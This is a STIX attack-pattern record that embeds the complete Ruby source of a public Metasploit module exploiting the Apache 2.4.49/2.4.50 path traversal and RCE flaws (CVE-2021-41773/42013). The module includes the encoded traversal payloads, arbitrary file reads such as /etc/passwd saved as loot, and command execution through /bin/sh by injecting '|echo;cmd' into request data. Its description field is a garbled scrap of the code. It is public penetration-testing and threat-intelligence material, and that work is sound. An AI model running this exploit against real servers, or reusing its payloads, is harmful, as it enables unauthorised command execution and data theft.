{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--590d05b4-b4d9-4c44-a4c8-874041bd761c",
    "created": "2024-08-14T16:28:57.198125Z",
    "modified": "2024-08-14T16:28:57.198129Z",
    "name": "Apache 2.4.49/2.4.50 Traversal RCE scanner",
    "description": "Read file on the remote server.  ] ] 'DefaultAction' => 'CHECK_TRAVERSAL' ) )  register_options([",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/apache_normalize_path.rb",
            "external_id": "apache_normalize_path.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-41773"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-42013"
        },
        {
            "source_name": "reference",
            "url": "https://httpd.apache.org/security/vulnerabilities_24.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache 2.4.49/2.4.50 Traversal RCE scanner',\n        'Description' => %q{\n          This module scans for an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).\n          If files outside of the document root are not protected by \u2018require all denied\u2019 and CGI has been explicitly enabled,\n          it can be used to execute arbitrary commands (Remote Command Execution).\n          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).\n        },\n        'References' => [\n          ['CVE', '2021-41773'],\n          ['CVE', '2021-42013'],\n          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],\n          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse'],\n          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml'],\n          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74'],\n          ['URL', 'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis']\n        ],\n        'Author' => [\n          'Ash Daulton', # Vulnerability discovery\n          'Dhiraj Mishra', # Metasploit auxiliary module\n          'mekhalleh (RAMELLA S\u00e9bastien)' # Metasploit exploit module (Zeop Entreprise)\n        ],\n        'DisclosureDate' => '2021-05-10',\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        },\n        'Actions' => [\n          [\n            'CHECK_TRAVERSAL',\n            {\n              'Description' => 'Check for vulnerability.'\n            }\n          ],\n          [\n            'CHECK_RCE',\n            {\n              'Description' => 'Check for RCE (if mod_cgi is enabled).'\n            }\n          ],\n          [\n            'READ_FILE',\n            {\n              'Description' => 'Read file on the remote server.'\n            }\n          ]\n        ],\n        'DefaultAction' => 'CHECK_TRAVERSAL'\n      )\n    )\n\n    register_options([\n      OptEnum.new('CVE', [true, 'The vulnerability to use', 'CVE-2021-42013', ['CVE-2021-41773', 'CVE-2021-42013']]),\n      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5]),\n      OptString.new('FILEPATH', [false, 'File you want to read', '/etc/passwd']),\n      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin'])\n    ])\n  end\n\n  def exec_traversal(cmd)\n    send_request_raw({\n      'method' => Rex::Text.rand_text_alpha(3..4),\n      'uri' => normalize_uri(datastore['TARGETURI'], @traversal.to_s),\n      'data' => \"#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{cmd}\"\n    })\n  end\n\n  def message(msg)\n    \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\"\n  end\n\n  def pick_payload\n    case datastore['CVE']\n    when 'CVE-2021-41773'\n      payload = '.%2e/'\n    when 'CVE-2021-42013'\n      payload = '.%%32%65/'\n    else\n      payload = ''\n    end\n\n    payload\n  end\n\n  def read_traversal\n    send_request_raw({\n      'method' => 'GET',\n      'uri' => normalize_uri(@target_uri, @traversal.to_s)\n    })\n  end\n\n  def run_host(ip)\n    @proto = (ssl ? 'https' : 'http')\n\n    case action.name\n    when 'CHECK_TRAVERSAL'\n      @target_uri = datastore['TARGETURI']\n      @traversal = pick_payload * datastore['DEPTH'] << '/etc/passwd'\n\n      response = read_traversal\n      unless response\n        print_error(message('No response, target seems down.'))\n\n        return Exploit::CheckCode::Unknown\n      end\n\n      if response.code == 200 && response.body.include?('root:x:0:0:')\n        print_good(message(\"The target is vulnerable to #{datastore['CVE']}.\"))\n\n        vprint_status(\"Obtained HTTP response code #{response.code}.\")\n        report_vuln(\n          host: target_host,\n          name: name,\n          refs: references\n        )\n\n        return Exploit::CheckCode::Vulnerable\n      end\n      print_error(message(\"The target is not vulnerable to #{datastore['CVE']}.\"))\n\n      return Exploit::CheckCode::Safe\n    when 'CHECK_RCE'\n      @traversal = pick_payload * datastore['DEPTH'] << '/bin/sh'\n      rand_str = Rex::Text.rand_text_alpha(4..8)\n\n      response = exec_traversal(\"echo #{rand_str}\")\n      unless response\n        print_error(message('No response, target seems down.'))\n\n        return Exploit::CheckCode::Unknown\n      end\n\n      if response.code == 200 && response.body.include?(rand_str)\n        print_good(message(\"The target is vulnerable to #{datastore['CVE']} (mod_cgi is enabled).\"))\n        report_vuln(\n          host: target_host,\n          name: name,\n          refs: references\n        )\n\n        return Exploit::CheckCode::Vulnerable\n      end\n      print_error(message(\"The target is not vulnerable to #{datastore['CVE']} (requires mod_cgi to be enabled).\"))\n\n      return Exploit::CheckCode::Safe\n    when 'READ_FILE'\n      fail_with(Failure::BadConfig, 'File path option is empty!') if !datastore['FILEPATH'] || datastore['FILEPATH'].empty?\n\n      @target_uri = datastore['TARGETURI']\n      @traversal = pick_payload * datastore['DEPTH'] << datastore['FILEPATH']\n\n      response = read_traversal\n      unless response\n        print_error(message('No response, target seems down.'))\n\n        return Exploit::CheckCode::Unknown\n      end\n\n      vprint_status(\"Obtained HTTP response code #{response.code}.\")\n      if response.code == 500\n        print_warning(message(\"The target is vulnerable to #{datastore['CVE']} (mod_cgi is enabled).\"))\n        report_vuln(\n          host: target_host,\n          name: name,\n          refs: references\n        )\n      end\n\n      if response.code == 500 || response.body.empty?\n        print_error('Nothing was downloaded')\n\n        return Exploit::CheckCode::Vulnerable if response.code == 500\n      end\n\n      if response.code == 200\n        vprint_good(\"#{peer} \\n#{response.body}\")\n        path = store_loot(\n          'apache.traversal',\n          'application/octet-stream',\n          ip,\n          response.body,\n          datastore['FILEPATH']\n        )\n        print_good(\"File saved in: #{path}\")\n\n        report_vuln(\n          host: target_host,\n          name: name,\n          refs: references\n        )\n\n        return Exploit::CheckCode::Vulnerable\n      end\n\n      return Exploit::CheckCode::Safe\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-05-10"
}